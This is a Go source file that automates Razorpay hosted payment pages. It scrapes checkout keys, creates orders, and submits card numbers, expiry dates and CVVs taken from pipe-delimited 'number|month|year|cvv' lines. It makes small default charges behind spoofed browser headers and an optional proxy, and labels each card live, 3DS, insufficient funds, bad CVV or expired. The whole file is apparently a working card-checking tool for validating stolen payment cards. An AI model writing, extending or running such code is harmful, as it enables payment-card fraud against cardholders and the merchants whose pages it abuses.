package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"regexp"
	"strconv"
	"strings"
)

type RazorpaySession struct {
	Client        *http.Client
	ProxyURL      string
	PageURL       string
	KeyID         string
	PageID        string
	Currency      string
	ItemID        string
	ItemAmount    int // amount in paise
	CustomAmount  int // amount in INR
}

type PaymentResult struct {
	Status   string `json:"status"`
	Response string `json:"response"`
	Message  string `json:"message"`
}

// ScrapePage fetches the hosted page and extracts checkout configuration.
func (s *RazorpaySession) ScrapePage() error {
	req, err := http.NewRequest("GET", s.PageURL, nil)
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

	resp, err := s.Client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to fetch page: %w", err)
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read body: %w", err)
	}
	html := string(bodyBytes)

	// Extract data JSON block
	re := regexp.MustCompile(`(?s)var\s+data\s*=\s*(\{.*?\});`)
	match := re.FindStringSubmatch(html)
	if len(match) < 2 {
		return fmt.Errorf("could not find data block in page HTML")
	}

	var parsed map[string]any
	if err := json.Unmarshal([]byte(match[1]), &parsed); err != nil {
		return fmt.Errorf("failed to parse page JSON: %w", err)
	}

	keyID, _ := parsed["key_id"].(string)
	if keyID == "" {
		return fmt.Errorf("key_id not found in page data")
	}
	s.KeyID = keyID

	paymentLink, _ := parsed["payment_link"].(map[string]any)
	if paymentLink == nil {
		return fmt.Errorf("payment_link metadata not found")
	}

	pageID, _ := paymentLink["id"].(string)
	if pageID == "" {
		return fmt.Errorf("payment page ID not found")
	}
	s.PageID = pageID

	currency, _ := paymentLink["currency"].(string)
	if currency == "" {
		currency = "INR"
	}
	s.Currency = currency

	// Parse items to find a valid item ID and amount
	items, _ := parsed["payment_page_items"].([]any)
	for _, it := range items {
		itemMap, ok := it.(map[string]any)
		if !ok {
			continue
		}
		id, _ := itemMap["id"].(string)
		itemDetail, _ := itemMap["item"].(map[string]any)
		if itemDetail == nil {
			continue
		}

		s.ItemID = id
		if amtVal, ok := itemDetail["amount"].(float64); ok && amtVal > 0 {
			s.ItemAmount = int(amtVal)
		}
		break
	}

	// Fallback to custom input amount if item amount is zero/empty
	if s.ItemAmount == 0 {
		if s.CustomAmount <= 0 {
			s.CustomAmount = 10 // default 10 INR
		}
		s.ItemAmount = s.CustomAmount * 100
	}

	return nil
}

// CreateOrder sends the order initialization payload to Razorpay and returns the order_id.
func (s *RazorpaySession) CreateOrder(name, email, phone string) (string, error) {
	url := fmt.Sprintf("https://api.razorpay.com/v1/payment_pages/%s/order", s.PageID)

	payload := map[string]any{
		"line_items": []map[string]any{
			{
				"payment_page_item_id": s.ItemID,
				"amount":               s.ItemAmount,
			},
		},
		"notes": map[string]string{
			"name":  name,
			"email": email,
			"phone": phone,
		},
	}

	bodyBytes, err := json.Marshal(payload)
	if err != nil {
		return "", err
	}

	req, err := http.NewRequest("POST", url, bytes.NewReader(bodyBytes))
	if err != nil {
		return "", err
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Origin", "https://pages.razorpay.com")
	req.Header.Set("Referer", s.PageURL)

	resp, err := s.Client.Do(req)
	if err != nil {
		return "", fmt.Errorf("order initialization failed: %w", err)
	}
	defer resp.Body.Close()

	respBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusCreated {
		return "", fmt.Errorf("order creation HTTP %d: %s", resp.StatusCode, string(respBytes))
	}

	var parsed map[string]any
	if err := json.Unmarshal(respBytes, &parsed); err != nil {
		return "", err
	}

	orderData, _ := parsed["order"].(map[string]any)
	if orderData == nil {
		return "", fmt.Errorf("order object missing in response: %s", string(respBytes))
	}

	orderID, _ := orderData["id"].(string)
	if orderID == "" {
		return "", fmt.Errorf("order_id missing in response")
	}

	return orderID, nil
}

// SubmitPayment authorizes the card using Razorpay payments API.
func (s *RazorpaySession) SubmitPayment(cardNo, expMonth, expYear, cvv, name, email, phone, orderID string) (*PaymentResult, error) {
	url := "https://api.razorpay.com/v1/payments"

	payload := map[string]any{
		"key_id":   s.KeyID,
		"order_id": orderID,
		"amount":   s.ItemAmount,
		"currency": s.Currency,
		"email":    email,
		"contact":  phone,
		"method":   "card",
		"card": map[string]string{
			"number":       cardNo,
			"cvv":          cvv,
			"expiry_month": expMonth,
			"expiry_year":  expYear,
			"name":         name,
		},
		"_": map[string]string{
			"integration":      "payment_pages",
			"integration_type": "rzp_app",
			"version":          "1.24.0",
		},
	}

	bodyBytes, err := json.Marshal(payload)
	if err != nil {
		return nil, err
	}

	req, err := http.NewRequest("POST", url, bytes.NewReader(bodyBytes))
	if err != nil {
		return nil, err
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Origin", "https://pages.razorpay.com")
	req.Header.Set("Referer", s.PageURL)

	resp, err := s.Client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("payment submission failed: %w", err)
	}
	defer resp.Body.Close()

	respBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	if resp.StatusCode == http.StatusOK {
		var parsed map[string]any
		_ = json.Unmarshal(respBytes, &parsed)

		// Check for 3DS / redirects
		if parsed["callback_url"] != nil || parsed["next"] != nil {
			return &PaymentResult{
				Status:   "3ds",
				Response: "3DS_REQUIRED",
				Message:  "Card verification (OTP/3DS) is required by the bank",
			}, nil
		}

		status, _ := parsed["status"].(string)
		if status == "captured" || status == "authorized" {
			return &PaymentResult{
				Status:   "success",
				Response: "SUCCESS",
				Message:  "Payment authorized successfully",
			}, nil
		}

		return &PaymentResult{
			Status:   "success",
			Response: "SUCCESS",
			Message:  fmt.Sprintf("Status: %s", status),
		}, nil
	}

	// Parse decline reason on bad request / failure codes
	var errResp map[string]any
	if jsonErr := json.Unmarshal(respBytes, &errResp); jsonErr == nil {
		if errData, ok := errResp["error"].(map[string]any); ok {
			reason, _ := errData["reason"].(string)
			desc, _ := errData["description"].(string)
			if desc == "" {
				desc = "Declined by gateway"
			}

			responseCode := "CARD_DECLINED"
			reasonUpper := strings.ToUpper(reason)
			if strings.Contains(reasonUpper, "INSUFFICIENT") {
				responseCode = "INSUFFICIENT_FUNDS"
			} else if strings.Contains(reasonUpper, "CVV") || strings.Contains(reasonUpper, "VERIFICATION") {
				responseCode = "CVV_INVALID"
			} else if strings.Contains(reasonUpper, "EXPIRED") {
				responseCode = "EXPIRED_CARD"
			}

			return &PaymentResult{
				Status:   "fail",
				Response: responseCode,
				Message:  desc,
			}, nil
		}
	}

	return &PaymentResult{
		Status:   "fail",
		Response: "GATEWAY_ERROR",
		Message:  fmt.Sprintf("HTTP %d: %s", resp.StatusCode, string(respBytes)),
	}, nil
}

// Helper: Parse card line
func parseCC(ccLine string) (number, month, year, cvv string, ok bool) {
	ccLine = strings.TrimSpace(ccLine)
	parts := strings.Split(ccLine, "|")
	if len(parts) < 4 {
		return "", "", "", "", false
	}
	number = strings.ReplaceAll(parts[0], " ", "")
	month = parts[1]
	year = parts[2]
	cvv = parts[3]

	if len(month) == 1 {
		month = "0" + month
	}
	if len(year) == 2 {
		year = "20" + year
	}
	return number, month, year, cvv, true
}

func formatAmount(amtPaise int) string {
	return strconv.FormatFloat(float64(amtPaise)/100.0, 'f', 2, 64)
}
